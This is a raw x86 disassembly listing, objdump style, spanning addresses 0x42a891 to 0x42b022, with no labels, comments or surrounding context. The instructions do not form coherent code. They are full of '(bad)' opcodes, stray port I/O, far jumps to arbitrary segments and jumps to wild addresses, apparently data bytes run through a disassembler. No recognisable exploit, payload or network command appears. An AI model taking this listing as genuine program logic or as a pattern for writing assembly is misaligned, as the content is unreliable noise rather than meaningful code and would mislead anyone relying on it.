  42a891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a892:	nop
  42a893:	add    BYTE PTR [ebp+0x19],dh
  42a896:	call   FWORD PTR [edx+0x4b]
  42a899:	ror    BYTE PTR [esi+edi*4+0x6d],1
  42a89d:	sbb    DWORD PTR [eax+0x27988986],esi
  42a8a3:	dec    eax
  42a8a4:	es jmp 0x42a851
  42a8a7:	xchg   BYTE PTR [eax-0x13],al
  42a8aa:	jmp    0x442b1dee
  42a8af:	ret    0xd530
  42a8b2:	add    ecx,DWORD PTR [ebp-0x58993110]
  42a8b8:	push   ds
  42a8b9:	sbb    BYTE PTR [edx+0x1229cfa6],0x75
  42a8c0:	ins    DWORD PTR es:[edi],dx
  42a8c1:	outs   dx,DWORD PTR ds:[esi]
  42a8c2:	mov    DWORD PTR [ebp+0x29],eax
  42a8c5:	imul   edx,DWORD PTR [edx],0x2345f6d2
  42a8cb:	add    dh,dh
  42a8cd:	fadd   QWORD PTR [edi]
  42a8cf:	lea    esi,[eax-0x7b184c03]
  42a8d5:	daa    
  42a8d6:	adc    eax,0x90d8f1fb
  42a8db:	or     eax,0x0
  42a8e0:	add    al,dh
  42a8e2:	lea    esp,[edx]
  42a8e4:	call   0xfb57f309
  42a8e9:	int    0xa6
  42a8eb:	add    eax,DWORD PTR [eax]
  42a8ed:	jne    0x42a8f1
  42a8ef:	jno    0x42a8f2
  42a8f1:	jne    0x42a90c
  42a8f3:	mov    BYTE PTR [ebp+0x21],al
  42a8f6:	leave  
  42a8f7:	sub    eax,DWORD PTR [edi]
  42a8f9:	lods   eax,DWORD PTR ds:[esi]
  42a8fa:	xor    edx,DWORD PTR [edx]
  42a8fc:	test   BYTE PTR [ebp+0x688cedb4],dh
  42a902:	xor    eax,0x4ba4d227
  42a907:	adc    bh,BYTE PTR [eax-0xe71b]
  42a90d:	(bad)  
  42a90f:	add    al,0x0
  42a911:	jne    0x42a915
  42a913:	data16 mov al,ds:0xc06c01ca
  42a919:	mov    ds:0x644680b1,al
  42a91e:	or     al,0x8a
  42a920:	jg     0x42a8d7
  42a922:	xchg   esp,eax
  42a923:	xrelease mov BYTE PTR [eax],ah
  42a926:	adc    dl,BYTE PTR [ecx+0x720c4452]
  42a92c:	sub    al,0x4e
  42a92e:	add    ecx,ebp
  42a930:	add    ebx,DWORD PTR [ebx]
  42a932:	div    BYTE PTR [ebx-0x40]
  42a935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a936:	mov    cl,0x6b
  42a938:	shl    BYTE PTR [edx],0xb3
  42a93b:	push   ecx
  42a93c:	sub    eax,0x2bdd3eea
  42a941:	arpl   si,ax
  42a943:	call   0x42a94b
  42a948:	add    BYTE PTR [eax],al
  42a94a:	in     al,dx
  42a94b:	mov    edi,0xeb8887c
  42a950:	cdq    
  42a951:	stos   DWORD PTR es:[edi],eax
  42a952:	out    0x2,eax
  42a954:	jmp    0xd653f65c
  42a959:	adc    eax,0x8c197e3e
  42a95e:	test   al,0x1a
  42a960:	ins    BYTE PTR es:[edi],dx
  42a961:	or     eax,0x3227e7e
  42a966:	jne    0x42a96a
  42a968:	outs   dx,BYTE PTR ds:[esi]
  42a969:	mov    eax,0xd2e09d26
  42a96e:	inc    eax
  42a96f:	jle    0x42a997
  42a971:	mov    esp,0x31641407
  42a976:	outs   dx,BYTE PTR ds:[esi]
  42a977:	jg     0x42a90f
  42a979:	add    al,0x75
  42a97b:	add    ah,dh
  42a97d:	xor    eax,0x88ddaffd
  42a982:	out    dx,eax
  42a983:	int    0xd5
  42a985:	add    eax,0x3e98362
  42a98a:	jne    0x42aa03
  42a98c:	and    edi,esp
  42a98e:	std    
  42a98f:	mov    edi,0x87f1b0ff
  42a994:	push   es
  42a995:	jmp    0xfda8918d
  42a99a:	repz mov edi,0xc5fa39d3
  42a9a0:	add    edi,DWORD PTR [ecx]
  42a9a2:	sub    bh,0x57
  42a9a5:	div    DWORD PTR [esi+0x6dad7e09]
  42a9ab:	jg     0x42a96d
  42a9ad:	hlt    
  42a9ae:	add    BYTE PTR [eax],al
  42a9b0:	add    BYTE PTR [eax],al
  42a9b2:	add    BYTE PTR [ebp-0x7f],bh
  42a9b5:	inc    ebp
  42a9b6:	xor    eax,0x24c205fe
  42a9bb:	ins    BYTE PTR es:[edi],dx
  42a9bc:	add    esp,edi
  42a9be:	stos   DWORD PTR es:[edi],eax
  42a9bf:	in     eax,dx
  42a9c0:	add    eax,0x95caa437
  42a9c5:	or     al,0x62
  42a9c7:	xor    cl,BYTE PTR [ebp+0x27]
  42a9ca:	and    esi,esi
  42a9cc:	or     al,BYTE PTR [eax+0x72026e03]
  42a9d2:	ucomiss xmm4,DWORD PTR [esi-0x7fbd4509]
  42a9d9:	mov    edi,0x66110202
  42a9de:	add    esi,edi
  42a9e0:	imul   esi,ebx,0x1848dc20
  42a9e6:	mov    ecx,0xb6f78f81
  42a9eb:	mov    edi,ebp
  42a9ed:	dec    ebx
  42a9ee:	fbstp  TBYTE PTR [esi]
  42a9f0:	or     DWORD PTR [esi+0x25],edi
  42a9f3:	jge    0x42a995
  42a9f5:	pop    ss
  42a9f6:	xchg   ecx,eax
  42a9f7:	pop    ds
  42a9f8:	mov    esi,0xe13ec2f3
  42a9fd:	not    DWORD PTR [eax]
  42a9ff:	mov    edx,0x91247f10
  42aa04:	jmp    0x5bf6:0xcfeeae7e
  42aa0b:	in     al,dx
  42aa0c:	cmp    DWORD PTR [ebp+0x0],0x477504e7
  42aa13:	popa   
  42aa14:	dec    eax
  42aa15:	mov    bh,0x50
  42aa17:	add    BYTE PTR [eax],al
  42aa19:	add    BYTE PTR [eax],al
  42aa1b:	add    BYTE PTR [esi],dh
  42aa1d:	push   es
  42aa1e:	push   edx
  42aa1f:	lea    edx,[ecx-0x1bba730e]
  42aa25:	fadd   st(6),st
  42aa27:	add    DWORD PTR [esp+eax*1+0x2089c085],ebx
  42aa2e:	div    BYTE PTR [ebp-0xc]
  42aa31:	fsubr  QWORD PTR [ecx+eax*1]
  42aa34:	mov    WORD PTR [ecx+ebp*8],es
  42aa37:	cli    
  42aa38:	adc    ch,dh
  42aa3a:	not    BYTE PTR [esi-0xc]
  42aa3d:	and    al,BYTE PTR [eax]
  42aa3f:	add    BYTE PTR [edx+ebx*2+0x7bbc5813],cl
  42aa46:	inc    ebp
  42aa47:	hlt    
  42aa48:	loope  0x42aa92
  42aa4a:	mov    bh,0x50
  42aa4c:	mov    ah,0x83
  42aa4e:	add    DWORD PTR [eax],eax
  42aa50:	dec    esp
  42aa51:	jnp    0x42aa43
  42aa53:	test   DWORD PTR [edx-0x6a16fc88],ebx
  42aa59:	in     eax,dx
  42aa5a:	idiv   bh
  42aa5c:	xlat   BYTE PTR ds:[ebx]
  42aa5d:	js     0x42aa42
  42aa5f:	mov    ebx,DWORD PTR [ecx]
  42aa61:	clc    
  42aa62:	dec    ebp
  42aa63:	push   0x3bb
  42aa68:	test   BYTE PTR [ebp+0x5583fe30],dh
  42aa6e:	test   eax,ebx
  42aa70:	je     0x42aa4f
  42aa72:	(bad)  
  42aa73:	dec    DWORD PTR [ecx+eax*4]
  42aa76:	jne    0x42aa68
  42aa78:	fs jb  0x42aaa6
  42aa7b:	inc    BYTE PTR [ebx]
  42aa7d:	mov    edx,edx
  42aa7f:	jne    0x42aa81
  42aa81:	add    BYTE PTR [eax],al
  42aa83:	add    BYTE PTR [eax],al
  42aa85:	and    eax,DWORD PTR [ecx+0x5c24ec75]
  42aa8b:	sub    edi,esi
  42aa8d:	shl    DWORD PTR [esi+0x19750086],cl
  42aa93:	jmp    esi
  42aa95:	outs   dx,DWORD PTR ds:[esi]
  42aa96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa97:	cwde   
  42aa98:	jmp    0x42aa67
  42aa9a:	loope  0x42aa6f
  42aa9c:	stc    
  42aa9d:	ror    BYTE PTR [edi+edi*1],cl
  42aaa0:	pop    ebx
  42aaa1:	sub    esi,esp
  42aaa3:	cmp    al,0xbe
  42aaa5:	jns    0x42aac0
  42aaa7:	mov    cl,cl
  42aaa9:	inc    eax
  42aaaa:	or     eax,0xb09d320e
  42aaaf:	add    eax,DWORD PTR [eax]
  42aab1:	jne    0x42aa4f
  42aab3:	in     eax,0xff
  42aab5:	(bad)  
  42aab6:	sub    edi,DWORD PTR [edx+0x2]
  42aab9:	neg    BYTE PTR [edx+0x8]
  42aabc:	push   ecx
  42aabd:	clc    
  42aabe:	pop    ecx
  42aabf:	cdq    
  42aac0:	nop    DWORD PTR [ecx]
  42aac3:	push   cs
  42aac4:	xor    eax,0xffc36f9d
  42aac9:	jnp    0x42aad1
  42aacb:	jecxz  0x42aadd
  42aacd:	mov    ch,0x19
  42aacf:	sbb    cl,BYTE PTR [ebx]
  42aad1:	lds    eax,FWORD PTR [ebx-0x9]
  42aad4:	cli    
  42aad5:	test   al,0xd1
  42aad7:	xor    eax,0xf8c0753f
  42aadc:	fwait
  42aadd:	fs pop ecx
  42aadf:	inc    DWORD PTR [ebp+esi*1+0x352e0246]
  42aae6:	fdivr  QWORD PTR [edx+eax*1+0x0]
  42aaea:	add    BYTE PTR [eax],al
  42aaec:	add    BYTE PTR [eax],al
  42aaee:	add    eax,0xb17f421a
  42aaf3:	cmp    eax,0x1da00003
  42aaf8:	push   cs
  42aaf9:	xor    cl,BYTE PTR ds:0x75fffe88
  42aaff:	pushf  
  42ab00:	in     eax,0xff
  42ab02:	pop    ds
  42ab03:	dec    ebx
  42ab04:	jp     0x42ab08
  42ab06:	or     al,BYTE PTR [ebp-0x2707fc1e]
  42ab0c:	cwde   
  42ab0d:	or     ah,BYTE PTR [ebp-0x35271dfe]
  42ab13:	das    
  42ab14:	es add al,0xee
  42ab17:	in     al,dx
  42ab18:	or     al,0xf5
  42ab1a:	mov    ds:0x4502be02,al
  42ab1f:	pushf  
  42ab20:	call   0x936d3337
  42ab25:	(bad)  
  42ab26:	retf   0xdc07
  42ab29:	outs   dx,DWORD PTR ds:[esi]
  42ab2a:	fs ret 0x88e8
  42ab2e:	mov    ch,0x8c
  42ab30:	in     al,dx
  42ab31:	aad    0xf2
  42ab33:	sbb    ah,ch
  42ab35:	jl     0x42abae
  42ab37:	push   edx
  42ab38:	call   0x66452482
  42ab3d:	inc    ebx
  42ab3e:	jno    0x42aaf2
  42ab40:	push   cs
  42ab41:	cld    
  42ab42:	(bad)  
  42ab43:	int3   
  42ab44:	mov    al,ds:0x72024a39
  42ab49:	clc    
  42ab4a:	push   esi
  42ab4b:	icebp  
  42ab4c:	sub    BYTE PTR [edx+edi*4],al
  42ab4f:	and    ch,0xe7
  42ab52:	add    BYTE PTR [eax],al
  42ab54:	add    BYTE PTR [eax],al
  42ab56:	add    BYTE PTR [esi+0x2],dh
  42ab59:	aam    0x7
  42ab5b:	call   0x48f:0x5ff53e42
  42ab62:	or     bl,dl
  42ab64:	add    al,BYTE PTR [edx-0x28]
  42ab67:	sub    ch,BYTE PTR ds:0xf04e03a6
  42ab6d:	or     al,0xf5
  42ab6f:	add    BYTE PTR [edx],0x27
  42ab72:	pop    es
  42ab73:	jne    0x42aaf6
  42ab75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ab76:	out    0x76,eax
  42ab78:	add    dl,BYTE PTR [ebp-0x3370d00b]
  42ab7e:	pop    es
  42ab7f:	fwait
  42ab80:	add    cl,BYTE PTR [edx]
  42ab82:	fadd   DWORD PTR [edx+0x2d]
  42ab85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab86:	add    ecx,DWORD PTR [esi]
  42ab88:	lock shl ah,1
  42ab8b:	dec    edx
  42ab8c:	add    al,BYTE PTR [eax]
  42ab8e:	sub    edi,DWORD PTR [edx+0x2]
  42ab91:	push   edx
  42ab92:	bound  esp,QWORD PTR [esi+0x7f]
  42ab95:	sti    
  42ab96:	pop    ebp
  42ab97:	in     al,dx
  42ab98:	jle    0x42ab8c
  42ab9a:	push   ebp
  42ab9b:	loopne 0x42ab58
  42ab9d:	cli    
  42ab9e:	sbb    eax,0xced01a3c
  42aba3:	test   BYTE PTR [ecx],cl
  42aba5:	test   DWORD PTR [edi-0x2eaceb16],edi
  42abab:	aas    
  42abac:	or     ebx,edi
  42abae:	mov    dh,0x7
  42abb0:	inc    ebp
  42abb1:	push   edx
  42abb2:	push   ss
  42abb3:	push   es
  42abb4:	jge    0x42ac2a
  42abb6:	int    0xaa
  42abb8:	jl     0x42ac36
  42abba:	lds    eax,FWORD PTR [eax]
  42abbc:	add    BYTE PTR [eax],al
  42abbe:	add    BYTE PTR [eax],al
  42abc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42abc1:	jl     0x42ac0f
  42abc3:	int    0x8e
  42abc5:	adc    al,0xa4
  42abc7:	xor    ah,ah
  42abc9:	stos   DWORD PTR es:[edi],eax
  42abca:	mov    ebp,0xc97f76f5
  42abcf:	cmc    
  42abd0:	xor    BYTE PTR [ebx-0x265027a],0x8c
  42abd7:	in     eax,0x78
  42abd9:	fsub   st(5),st
  42abdb:	mov    cl,0x2f
  42abdd:	jg     0x42abf3
  42abdf:	out    0xee,eax
  42abe1:	bnd je 0x42ac42
  42abe4:	daa    
  42abe5:	inc    edi
  42abe6:	add    al,0xe9
  42abe8:	sbb    al,0x8
  42abea:	je     0x42abf9
  42abec:	jne    0x42ac08
  42abee:	push   0x8709643e
  42abf3:	cmp    edx,edi
  42abf5:	pcmpeqb mm3,mm3
  42abf8:	mov    fs,WORD PTR gs:[ebx]
  42abfb:	cmc    
  42abfc:	test   DWORD PTR [esi+0x7eced23],ecx
  42ac02:	adc    eax,0xffc51ca5
  42ac07:	imul   ebp,DWORD PTR [ebp+0x620086f6],0x1c08bd50
  42ac11:	xchg   BYTE PTR [esi],al
  42ac13:	push   esi
  42ac14:	xchg   edi,eax
  42ac15:	out    dx,al
  42ac16:	cli    
  42ac17:	retf   0x9274
  42ac1a:	cmc    
  42ac1b:	(bad)  
  42ac1c:	fstp   TBYTE PTR [eax+eax*8+0x74]
  42ac20:	jne    0x42aba9
  42ac22:	sub    eax,0x3
  42ac27:	add    BYTE PTR [eax],al
  42ac29:	or     DWORD PTR [edi-0xa],0x74
  42ac2d:	jo     0x42ac31
  42ac2f:	dec    esi
  42ac30:	push   DWORD PTR [ecx-0x23bfeebc]
  42ac36:	jge    0x42abfc
  42ac38:	or     al,0xcd
  42ac3a:	adc    DWORD PTR [edx+0x2afeb7c6],eax
  42ac40:	sar    BYTE PTR [edx],0xbc
  42ac43:	add    eax,DWORD PTR [eax]
  42ac45:	bound  ecx,QWORD PTR [ebx+0x2a]
  42ac48:	inc    ebp
  42ac4a:	je     0x42ac6b
  42ac4c:	or     al,0x82
  42ac4e:	or     eax,0xf0a7f182
  42ac53:	or     DWORD PTR [edx+edx*4],0xd63a0f86
  42ac5a:	imul   eax,DWORD PTR [esi],0x47
  42ac5d:	dec    esp
  42ac5e:	aaa    
  42ac5f:	ja     0x42ac85
  42ac61:	push   0x9c33e66e
  42ac66:	push   edx
  42ac67:	pop    ecx
  42ac68:	ret    0x50
  42ac6b:	pop    es
  42ac6c:	mov    dh,0x9e
  42ac6e:	add    ch,BYTE PTR [esi-0x1d43983f]
  42ac74:	icebp  
  42ac75:	mov    ebp,DWORD PTR [ebx+0x1f]
  42ac78:	or     BYTE PTR [esi],dh
  42ac7a:	add    bh,dh
  42ac7c:	je     0x42acee
  42ac7e:	add    dh,bh
  42ac80:	adc    eax,0x3b09ec
  42ac85:	lahf   
  42ac86:	mov    ebx,0x2175c20b
  42ac8b:	call   DWORD PTR [ecx+0x0]
  42ac8e:	add    BYTE PTR [eax],al
  42ac90:	add    BYTE PTR [eax],al
  42ac92:	ret    0xab32
  42ac95:	and    eax,DWORD PTR [ecx-0x56d71c79]
  42ac9b:	cmp    eax,0xa1022efb
  42aca0:	push   cs
  42aca1:	dec    edi
  42aca2:	cli    
  42aca3:	(bad)  
  42aca4:	loop   0x42acb9
  42aca6:	dec    ebx
  42aca7:	sbb    al,0xf9
  42aca9:	push   edi
  42acaa:	sbb    ecx,0x3
  42acad:	jg     0x42ac68
  42acaf:	sbb    eax,0x2461c088
  42acb4:	ret    0x8e41
  42acb7:	mov    ebp,0x3e430be7
  42acbc:	iret   
  42acbd:	mov    edi,0x83deb22
  42acc2:	jne    0x42ac64
  42acc4:	inc    ecx
  42acc5:	out    0xaa,eax
  42acc7:	and    al,bl
  42acc9:	and    esi,DWORD PTR [ecx-0x18]
  42accc:	out    0x36,al
  42acce:	lods   eax,DWORD PTR ds:[esi]
  42accf:	in     al,0xf2
  42acd1:	jae    0x42ac57
  42acd3:	inc    eax
  42acd4:	inc    esp
  42acd5:	push   eax
  42acd6:	and    al,0x7c
  42acd8:	cwde   
  42acd9:	and    edi,DWORD PTR [ecx-0x7c]
  42acdc:	clc    
  42acdd:	dec    ebx
  42acde:	imul   ebx,ecx,0x3
  42ace1:	jg     0x42ac94
  42ace3:	and    eax,0x175e014f
  42ace8:	sar    DWORD PTR [edi+0x54ff1d37],1
  42acee:	out    dx,al
  42acef:	mov    esp,0x9ebdec7e
  42acf4:	inc    ebx
  42acf5:	or     eax,DWORD PTR [eax]
  42acf7:	add    BYTE PTR [eax],al
  42acf9:	add    BYTE PTR [eax],al
  42acfb:	stc    
  42acfc:	int3   
  42acfd:	add    eax,DWORD PTR [eax]
  42acff:	jne    0x42ac9f
  42ad01:	adc    DWORD PTR [ebx],ecx
  42ad03:	stc    
  42ad04:	aam    0x3
  42ad06:	add    BYTE PTR [ebp-0x66],dh
  42ad09:	retf   
  42ad0a:	inc    esp
  42ad0b:	mov    DWORD PTR [edx],0xe8a6b3a6
  42ad11:	imul   eax,ecx,0xffffffce
  42ad14:	mov    al,0x7e
  42ad16:	add    ebp,eax
  42ad18:	mov    ah,0x30
  42ad1a:	mov    ch,0x1a
  42ad1c:	fsubr  st(1),st
  42ad1e:	or     eax,0x99297d0e
  42ad23:	ja     0x42acbd
  42ad25:	hlt    
  42ad26:	sbb    al,0xd1
  42ad28:	add    ecx,ebp
  42ad2a:	add    esi,DWORD PTR [edx+0x7]
  42ad2d:	repnz (bad) 
  42ad2f:	imul   DWORD PTR [ecx+ebp*8+0x3]
  42ad33:	jne    0x42ad38
  42ad35:	or     eax,0x277f9f71
  42ad3a:	add    al,0xfa
  42ad3c:	shl    eax,0xe8
  42ad3f:	dec    edi
  42ad40:	mov    BYTE PTR [edx+eiz*8-0x3ca27c25],bh
  42ad47:	jbe    0x42ad60
  42ad49:	xor    BYTE PTR [ebx-0x6a71fda9],al
  42ad4f:	jg     0x42ad9c
  42ad51:	sub    esp,esi
  42ad53:	fwait
  42ad54:	xchg   ebx,eax
  42ad55:	loope  0x42adad
  42ad57:	xor    eax,0x7f9b7df0
  42ad5c:	dec    ebx
  42ad5d:	xor    DWORD PTR [eax],eax
  42ad5f:	add    BYTE PTR [eax],al
  42ad61:	add    BYTE PTR [eax],al
  42ad63:	add    BYTE PTR [edi+0x7497e740],al
  42ad69:	repz cmp ebx,eax
  42ad6c:	popw   ss
  42ad6e:	adc    BYTE PTR [ebx+0x34],bh
  42ad71:	les    edx,FWORD PTR [eax+0x2]
  42ad74:	jmp    0xe285:0xae1a5aca
  42ad7b:	push   cs
  42ad7c:	push   edx
  42ad7d:	dec    edi
  42ad7e:	push   ebx
  42ad7f:	ret    
  42ad80:	jle    0x42ad88
  42ad82:	mov    ebp,0xa8b97e05
  42ad87:	cmc    
  42ad88:	pop    ebx
  42ad89:	inc    ecx
  42ad8a:	add    BYTE PTR [edx+0x7e],ch
  42ad8d:	std    
  42ad8e:	out    0xf0,al
  42ad90:	xor    esi,DWORD PTR [ebp+0x318e033f]
  42ad96:	or     edx,DWORD PTR [esi+0x36]
  42ad99:	push   ds
  42ad9a:	out    0xc4,eax
  42ad9c:	sbb    esi,DWORD PTR [ebp-0x35880eb9]
  42ada2:	mov    bh,dh
  42ada4:	outs   dx,DWORD PTR ds:[esi]
  42ada5:	daa    
  42ada6:	ret    
  42ada7:	out    0x4e,eax
  42ada9:	ins    BYTE PTR es:[edi],dx
  42adaa:	inc    eax
  42adab:	jmp    0x364dcd0f
  42adb0:	mov    dh,0xd
  42adb2:	repz mov ecx,0x960b128c
  42adb8:	mov    ecx,0x6dc1c10d
  42adbd:	jmp    0x426c8bc4
  42adc2:	or     al,0xa8
  42adc4:	imul   eax,DWORD PTR [edi],0xc97f
  42adca:	add    BYTE PTR [eax],al
  42adcc:	add    BYTE PTR [esi-0x75],dh
  42adcf:	add    edx,edi
  42add1:	ss retf 
  42add3:	mov    esi,0xfde98243
  42add8:	adc    bh,BYTE PTR [ebx+0x5a]
  42addb:	leave  
  42addc:	stos   BYTE PTR es:[edi],al
  42addd:	sub    DWORD PTR [ebp+edi*2+0x7db2712b],esp
  42ade4:	sub    edi,DWORD PTR [ecx-0x48]
  42ade7:	jge    0x42ae14
  42ade9:	jno    0x42adad
  42adeb:	jge    0x42ae18
  42aded:	jns    0x42adb3
  42adef:	jge    0x42ae1c
  42adf1:	jno    0x42adaa
  42adf3:	jge    0x42ae20
  42adf5:	jns    0x42addd
  42adf7:	jge    0x42ada4
  42adf9:	jbe    0x42adf2
  42adfb:	jge    0x42ada8
  42adfd:	jbe    0x42adf8
  42adff:	jge    0x42adac
  42ae01:	jbe    0x42ae06
  42ae03:	jg     0x42adb0
  42ae05:	jbe    0x42adbe
  42ae07:	jge    0x42ae09
  42ae09:	push   ds
  42ae0a:	add    eax,0x50e8303
  42ae0f:	or     eax,DWORD PTR [ebx-0x7cecfaf2]
  42ae15:	fiadd  WORD PTR [esp]
  42ae18:	sbb    esi,0x4
  42ae1b:	xlat   BYTE PTR ds:[ebx]
  42ae1c:	or     dh,0x4
  42ae1f:	push   ebp
  42ae20:	mov    esi,DWORD PTR [eax-0x7b]
  42ae23:	jmp    0x42ae39
  42ae25:	push   ds
  42ae26:	add    eax,0xcc18300
  42ae2b:	not    DWORD PTR [ebx-0x16]
  42ae2e:	rcl    cl,cl
  42ae30:	push   0x0
  42ae32:	add    BYTE PTR [eax],al
  42ae34:	add    BYTE PTR [eax],al
  42ae36:	or     BYTE PTR [eax+0xde1ec85],al
  42ae3c:	not    DWORD PTR [eax-0x2d]
  42ae3f:	xchg   edi,eax
  42ae40:	add    ch,BYTE PTR [edx-0x26]
  42ae43:	lods   al,BYTE PTR ds:[esi]
  42ae44:	loop   0x42ae4b
  42ae46:	dec    edx
  42ae47:	push   cs
  42ae48:	test   DWORD PTR [ebp-0x2dea7],0x75f5b4b3
  42ae52:	ror    BYTE PTR ds:0x7b41875,1
  42ae58:	aaa    
  42ae59:	jmp    ebx
  42ae5b:	jns    0x42ae4d
  42ae5d:	test   DWORD PTR [edx],ecx
  42ae5f:	cdq    
  42ae60:	cmp    DWORD PTR [ebx+0x73faf681],eax
  42ae66:	pushf  
  42ae67:	or     eax,0x98031075
  42ae6c:	adc    bh,bh
  42ae6e:	test   eax,0x8c400990
  42ae73:	xchg   DWORD PTR [edi+0x750db874],edi
  42ae79:	adc    al,0xd1
  42ae7b:	enter  0x6af2,0x5d
  42ae7f:	call   0xc000:0x44c67fa
  42ae86:	jne    0x42aee0
  42ae88:	xchg   edx,eax
  42ae89:	pop    ss
  42ae8a:	pop    ebp
  42ae8b:	je     0x42aef7
  42ae8d:	cli    
  42ae8e:	dec    edx
  42ae8f:	outs   dx,BYTE PTR ds:[esi]
  42ae90:	aas    
  42ae91:	jne    0x42aef1
  42ae93:	inc    eax
  42ae94:	repnz or esp,DWORD PTR [esi-0x57]
  42ae98:	(bad)  
  42ae99:	jle    0x42ae9b
  42ae9b:	add    BYTE PTR [eax],al
  42ae9d:	add    BYTE PTR [eax],al
  42ae9f:	sub    eax,0x6802929a
  42aea4:	pusha  
  42aea5:	(bad)  
  42aea6:	push   DWORD PTR [ebp-0x6a]
  42aea9:	add    edi,edx
  42aeab:	ss push 0x8
  42aeae:	xchg   DWORD PTR fs:[ebx-0x30],esp
  42aeb2:	icebp  
  42aeb3:	clc    
  42aeb4:	scas   al,BYTE PTR es:[edi]
  42aeb5:	push   es
  42aeb6:	call   0xfb500d50
  42aebb:	out    dx,al
  42aebc:	das    
  42aebd:	lods   eax,DWORD PTR ds:[esi]
  42aebe:	push   esi
  42aebf:	mov    esp,0x41fff32b
  42aec4:	je     0x42aede
  42aec6:	push   ecx
  42aec7:	inc    esp
  42aec8:	push   ebx
  42aec9:	add    al,0xb8
  42aecb:	pop    edx
  42aecc:	adc    edi,ebp
  42aece:	(bad)  
  42aecf:	(bad)  
  42aed1:	jg     0x42aece
  42aed3:	retf   0x1b82
  42aed6:	inc    edx
  42aed8:	jmp    0xcc058056
  42aedd:	jl     0x42af24
  42aedf:	lods   eax,DWORD PTR ds:[esi]
  42aee0:	inc    ebx
  42aee1:	add    al,0x87
  42aee3:	mov    ah,0x72
  42aee5:	mov    cl,0xfb
  42aee7:	(bad)  
  42aee8:	cmc    
  42aee9:	jg     0x42aee6
  42aeeb:	call   0x9991:0x39ff3bdc
  42aef2:	jmp    DWORD PTR [edi+0x36]
  42aef5:	or     BYTE PTR [eax+0x65],ch
  42aef8:	enter  0xfffe,0x24
  42aefc:	sbb    DWORD PTR [esi+esi*8],ebx
  42aeff:	arpl   cx,bp
  42af01:	(bad)  
  42af02:	inc    BYTE PTR [eax]
  42af04:	add    BYTE PTR [eax],al
  42af06:	add    BYTE PTR [eax],al
  42af08:	jae    0x42af0c
  42af0a:	div    BYTE PTR [edx+0x7ce28976]
  42af10:	mov    DWORD PTR [esi],0x45fa4720
  42af16:	add    eax,0xd4683f4
  42af1b:	cld    
  42af1c:	(bad)  
  42af1d:	adc    DWORD PTR [edi+0xd45f3fd],esi
  42af23:	clc    
  42af24:	imul   eax,DWORD PTR [esi+0x5],0x0
  42af28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af29:	add    eax,0xebb543d6
  42af2e:	out    0xd6,al
  42af30:	fcmovb st,st(3)
  42af32:	clc    
  42af33:	add    ebp,DWORD PTR [eax+0x1986fc8b]
  42af39:	xor    dl,BYTE PTR [esi-0x5c72584f]
  42af3f:	das    
  42af40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af41:	lea    ebp,[ebx-0x5c72bae1]
  42af47:	pop    ss
  42af48:	inc    ebp
  42af49:	mov    ebp,DWORD PTR [ebx]
  42af4b:	cld    
  42af4c:	icebp  
  42af4d:	pop    esp
  42af4e:	mov    ebp,0xd29f6f1b
  42af53:	or     bh,cl
  42af55:	rcr    ecx,0x7f
  42af58:	enter  0xe901,0x3
  42af5c:	cli    
  42af5d:	inc    esp
  42af5e:	in     eax,dx
  42af5f:	jle    0x42afbe
  42af61:	mov    esi,DWORD PTR [eax]
  42af63:	add    dl,bh
  42af65:	(bad)  
  42af66:	pop    ebp
  42af67:	push   ss
  42af68:	jecxz  0x42af6b
  42af6a:	sub    DWORD PTR [eax],esp
  42af6c:	add    BYTE PTR [eax],al
  42af6e:	add    BYTE PTR [eax],al
  42af70:	add    BYTE PTR [ebp-0x47],cl
  42af73:	push   0xd0027500
  42af78:	shl    BYTE PTR [edx+0x7192ef73],0x39
  42af7f:	cld    
  42af80:	pop    ss
  42af81:	adc    edx,DWORD PTR [ebx]
  42af83:	jp     0x42af15
  42af85:	mov    al,BYTE PTR [edx]
  42af87:	add    BYTE PTR [ebx+0x7f],bh
  42af8a:	ja     0x42af78
  42af8c:	fidiv  DWORD PTR [ecx-0xaaeadae]
  42af92:	stc    
  42af93:	cli    
  42af94:	pop    esi
  42af95:	jnp    0x42af93
  42af97:	xor    BYTE PTR [ecx],ch
  42af99:	rol    dl,cl
  42af9b:	or     ah,BYTE PTR [ebp-0x33]
  42af9e:	add    al,BYTE PTR [eax]
  42afa0:	jmp    0x3ac97168
  42afa5:	sub    DWORD PTR [edi-0x18],eax
  42afa8:	mov    ebx,0xf0057120
  42afad:	add    eax,0x6ffa6de2
  42afb2:	ja     0x42af9c
  42afb4:	jmp    0xc30b:0xd74f980
  42afbb:	dec    edi
  42afbc:	mov    bh,0x6e
  42afbe:	pop    edx
  42afbf:	sti    
  42afc0:	push   es
  42afc1:	outs   dx,DWORD PTR ds:[esi]
  42afc2:	in     eax,0xfd
  42afc4:	mov    edx,0x7dbf86b6
  42afc9:	adc    al,BYTE PTR [ebp+0x3b8362c2]
  42afcf:	inc    ebp
  42afd0:	leave  
  42afd1:	or     ebx,DWORD PTR [eax]
  42afd3:	jae    0x42afb9
  42afd5:	add    BYTE PTR [eax],al
  42afd7:	add    BYTE PTR [eax],al
  42afd9:	add    BYTE PTR [edi-0x37a4238a],ch
  42afdf:	clc    
  42afe0:	je     0x42afab
  42afe2:	jo     0x42afd0
  42afe4:	cli    
  42afe5:	cmp    al,0x8d
  42afe7:	or     eax,0xe60719c1
  42afec:	sub    dh,BYTE PTR [esi-0x14190684]
  42aff2:	sar    BYTE PTR [ebp+0x3505a983],0x87
  42aff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42affa:	sbb    ch,ch
  42affc:	cmp    BYTE PTR [ecx+eiz*2],ch
  42afff:	ins    BYTE PTR es:[edi],dx
  42b000:	push   ss
  42b001:	push   ss
  42b002:	mov    bh,BYTE PTR [edx]
  42b004:	jne    0x42b006
  42b006:	loopne 0x42af9c
  42b008:	or     edi,edi
  42b00a:	sub    DWORD PTR [ecx],0x8debf1fb
  42b010:	into   
  42b011:	adc    ebx,DWORD PTR ds:0x52e850b6
  42b017:	or     dh,bh
  42b019:	inc    edi
  42b01b:	add    al,0x2a
  42b01d:	shl    al,0x46
  42b020:	je     0x42b034
  42b022:	xlat   BYTE PTR ds:[ebx]
